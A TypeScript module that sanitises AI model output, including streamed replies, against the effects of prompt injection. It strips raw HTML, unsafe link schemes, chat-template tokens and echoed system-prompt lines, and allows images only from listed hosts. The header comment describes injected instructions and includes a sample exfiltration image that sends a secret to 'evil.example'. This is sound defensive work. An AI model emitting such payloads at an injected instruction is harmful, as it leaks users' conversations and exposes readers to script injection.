// Safe input & output handling, front 3: text that is about to be delivered -- to a person's screen, a Slack channel, an email, a
// webhook -- after a model or a tool wrote it. The model may have been told, by a web page or a pasted document, to do any of these:
//   - put a script, an iframe or an event handler into the answer          -> raw HTML is taken out (outside code)
//   - add a link that runs code when clicked                               -> javascript:, data:, vbscript:, file: links keep their text, lose the link
//   - add an image whose address carries the conversation away             -> ![x](https://evil.example/?q=secret) is dropped unless the
//     picture comes from a host we serve pictures from
//   - print its own instructions                                            -> lines of the system prompt, and chat-template control
//     tokens (<|im_start|>, [INST], <<SYS>>), are removed
// Code blocks and inline code are never touched (a generated web page is allowed to contain <script>); where the text is later shown
// is the screen's job (the app renders markdown without raw HTML, and sandboxes generated pages).
// Everything is plain string work, a few microseconds for a normal answer.

import { cleanText } from "./clean-text.ts";

/** Hosts a picture in a reply may come from (a suffix starting with "." matches any subdomain). */
export const DEFAULT_IMAGE_HOSTS: readonly string[] = [".supabase.co", ".supabase.in", "nazai.net", ".nazai.net", "images.unsplash.com", "oaidalleapiprodscus.blob.core.windows.net"];

export type GuardOptions = {
  imageHosts?: readonly string[];
  /** Fragments of the instructions the model was given; any line of the output containing one is replaced. See leakFragments(). */
  leakFragments?: readonly string[];
  max?: number;
};
export type GuardResult = { text: string; changed: boolean; notes: string[] };

const BAD_SCHEME = /^\s*(?:javascript|vbscript|data|file|blob|about):/i;
// <|im_start|> <|endoftext|> <<SYS>> <</SYS>> [INST] [/INST] <s> </s>
const TEMPLATE_TOKENS = /<\|[a-z_0-9 -]{1,30}\|>|<<\/?SYS>>|\[\/?INST\]|<\/?s>(?=\s|$)/gi;
const DANGEROUS_BLOCKS = /<\s*(script|style|iframe|object|embed|noscript|template|svg|math)\b[^>]{0,1000}>[\s\S]{0,200000}?<\s*\/\s*\1\s*>/gi;
const DANGEROUS_OPEN = /<\s*\/?\s*(script|style|iframe|object|embed|link|meta|base|form|input|button|frame|frameset|applet|noscript|template|svg|math)\b[^>]{0,1000}>?/gi;
const HTML_TAG = /<\/?[a-zA-Z][a-zA-Z0-9-]{0,30}(?:\s[^<>]{0,1000})?\/?>/g;

function hostAllowed(host: string, hosts: readonly string[]): boolean {
  const h = host.toLowerCase();
  return hosts.some((a) => (a.startsWith(".") ? h.endsWith(a) : h === a));
}

/** Splits text into [text, isCode] parts so code is left alone. */
function splitCode(s: string): { t: string; code: boolean }[] {
  const out: { t: string; code: boolean }[] = [];
  const re = /(```[\s\S]*?(?:```|$)|~~~[\s\S]*?(?:~~~|$)|`[^`\n]+`)/g;
  let last = 0;
  for (const m of s.matchAll(re)) {
    if (m.index! > last) out.push({ t: s.slice(last, m.index), code: false });
    out.push({ t: m[0], code: true });
    last = m.index! + m[0].length;
  }
  if (last < s.length) out.push({ t: s.slice(last), code: false });
  return out;
}

/** Lines of a prompt long enough to be recognised if they are echoed back (for GuardOptions.leakFragments). */
export function leakFragments(prompt: string, o: { minLength?: number; max?: number } = {}): string[] {
  const min = o.minLength ?? 48;
  const lines = prompt.split(/\r?\n/).map((l) => l.replace(/^[\s>*#-]+/, "").trim()).filter((l) => l.length >= min);
  // the middle of a long line is enough to recognise it
  return [...new Set(lines.map((l) => l.slice(0, 80)))].slice(0, o.max ?? 16);
}

function guardPlain(t: string, opts: GuardOptions, notes: Set<string>): string {
  let s = t;
  const before = s;
  s = s.replace(TEMPLATE_TOKENS, () => { notes.add("removed template markers"); return ""; });
  s = s.replace(DANGEROUS_BLOCKS, () => { notes.add("removed embedded code or frames"); return ""; });
  s = s.replace(DANGEROUS_OPEN, () => { notes.add("removed embedded code or frames"); return ""; });
  // on* handlers and other attributes live inside tags; with the tags removed they are gone. Remaining tags keep their text.
  s = s.replace(HTML_TAG, () => { notes.add("removed raw HTML"); return ""; });
  // images: ![alt](url "title")
  s = s.replace(/!\[([^\]\n]{0,300})\]\(\s*<?((?:[^()\s>]|\([^()\s]{0,200}\)){0,2000})>?(?:\s+"[^"\n]{0,300}")?\s*\)/g, (_m, alt: string, url: string) => {
    try {
      const u = new URL(url);
      if (u.protocol === "https:" && hostAllowed(u.hostname, opts.imageHosts ?? DEFAULT_IMAGE_HOSTS)) return `![${alt}](${u.toString()})`;
    } catch { /* relative or malformed: not allowed */ }
    notes.add("removed an outside image");
    return alt;
  });
  // reference-style images and definitions pointing at a bad scheme
  s = s.replace(/^\s{0,3}\[[^\]\n]{1,200}\]:\s*(\S{1,2000}).{0,500}$/gm, (line, url: string) => (BAD_SCHEME.test(url) ? (notes.add("removed an unsafe link"), "") : line));
  // links: [text](url)
  s = s.replace(/\[([^\]\n]{0,300})\]\(\s*<?((?:[^()\s>]|\([^()\s]{0,200}\)){0,2000})>?((?:\s+"[^"\n]{0,300}")?)\s*\)/g, (m, text: string, url: string) => {
    if (BAD_SCHEME.test(decodeEntities(url))) { notes.add("removed an unsafe link"); return text; }
    return m;
  });
  // autolinks <javascript:...>
  s = s.replace(/<\s*(?:javascript|vbscript|data|file):[^>]{0,2000}>/gi, () => { notes.add("removed an unsafe link"); return ""; });
  for (const frag of opts.leakFragments ?? []) {
    if (frag.length >= 24 && s.includes(frag)) {
      s = s.split("\n").map((line) => (line.includes(frag) ? (notes.add("removed echoed instructions"), "[removed]") : line)).join("\n");
    }
  }
  return s === before ? t : s;
}

function decodeEntities(u: string): string {
  return u.replace(/&#x([0-9a-f]+);?/gi, (_m, h: string) => String.fromCodePoint(parseInt(h, 16) || 32))
    .replace(/&#(\d+);?/g, (_m, d: string) => String.fromCodePoint(parseInt(d, 10) || 32))
    .replace(/&colon;/gi, ":").replace(/&tab;|&newline;/gi, "").replace(/[\u0000- ]+/g, "");
}

export function guardOutputText(input: unknown, opts: GuardOptions = {}): GuardResult {
  const original = typeof input === "string" ? input : input == null ? "" : String(input);
  const notes = new Set<string>();
  let s = cleanText(original, { trim: false, max: opts.max });
  if (s !== original) notes.add("cleaned control characters");
  s = splitCode(s).map((p) => (p.code ? p.t : guardPlain(p.t, opts, notes))).join("");
  return { text: s, changed: s !== original, notes: [...notes] };
}

/**
 * For a streamed answer (server-sent events carrying chat deltas): the text is held back to the end of each line, guarded, and let
 * through, so a link or an image split across two chunks is still seen whole. Lines are short; the stream still reads as live.
 */
export function guardedDeltaStream(source: ReadableStream<Uint8Array>, opts: GuardOptions = {}): ReadableStream<Uint8Array> {
  const enc = new TextEncoder(), dec = new TextDecoder();
  let sse = "";      // incomplete SSE line
  let pending = "";  // model text not yet at a line end
  let inFence = false;
  const delta = (text: string) => enc.encode(`data: ${JSON.stringify({ choices: [{ delta: { content: text } }] })}\n\n`);
  const emit = (controller: TransformStreamDefaultController<Uint8Array>, line: string) => {
    const isFence = /^\s*(```|~~~)/.test(line);
    if (isFence) inFence = !inFence;
    // a line inside a code fence is code, and a fence line itself passes unchanged
    const out = inFence || isFence ? line : guardOutputText(line.replace(/\n$/, ""), { ...opts, max: undefined }).text + (line.endsWith("\n") ? "\n" : "");
    if (out) controller.enqueue(delta(out));
  };
  const flush = (controller: TransformStreamDefaultController<Uint8Array>, force: boolean) => {
    let idx: number;
    while ((idx = pending.indexOf("\n")) >= 0) { emit(controller, pending.slice(0, idx + 1)); pending = pending.slice(idx + 1); }
    if (force && pending) { emit(controller, pending); pending = ""; }
  };
  const ts = new TransformStream<Uint8Array, Uint8Array>({
    transform(chunk, controller) {
      sse += dec.decode(chunk, { stream: true });
      let nl: number;
      while ((nl = sse.indexOf("\n")) >= 0) {
        const line = sse.slice(0, nl).trim(); sse = sse.slice(nl + 1);
        if (!line.startsWith("data:")) continue;
        const data = line.slice(5).trim();
        if (data === "[DONE]") { flush(controller, true); controller.enqueue(enc.encode("data: [DONE]\n\n")); continue; }
        try {
          const j = JSON.parse(data);
          const piece = j?.choices?.[0]?.delta?.content;
          if (typeof piece === "string" && piece) { pending += piece; flush(controller, false); }
        } catch { /* a line that is not JSON is dropped */ }
      }
    },
    flush(controller) { flush(controller, true); },
  });
  return source.pipeThrough(ts);
}
